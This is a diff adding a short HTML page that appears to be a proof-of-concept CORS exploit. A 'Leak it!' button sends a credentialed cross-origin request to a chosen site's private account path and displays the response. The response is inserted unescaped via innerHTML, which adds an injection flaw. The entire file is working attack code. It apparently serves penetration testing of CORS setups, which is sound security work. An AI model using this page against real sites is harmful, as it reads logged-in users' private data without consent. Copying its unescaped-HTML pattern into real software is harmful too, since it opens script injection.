@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<input id="host" type="text" size="30" value="https://cors-misconfigured-website">
+<input id="path" type="text" size="50" value="/some-private-account-info">
+<button onclick="corstest()">Leak it!</button>
+<hr>
+<textarea id="corsleak_text" rows="20" style="width:99%" readonly></textarea>
+<hr>
+<code id="corsleak_html"></code>
+<script>
+  function corstest() {
+    document.getElementById('corsleak_text').value = "";
+    document.getElementById('corsleak_html').innerHTML = "";
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('GET', document.getElementById('host').value + document.getElementById('path').value);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+      document.getElementById('corsleak_text').value = this.responseText;
+      document.getElementById('corsleak_html').innerHTML = this.responseText;
+    }
+}
+</script>
+</body>
+</html>
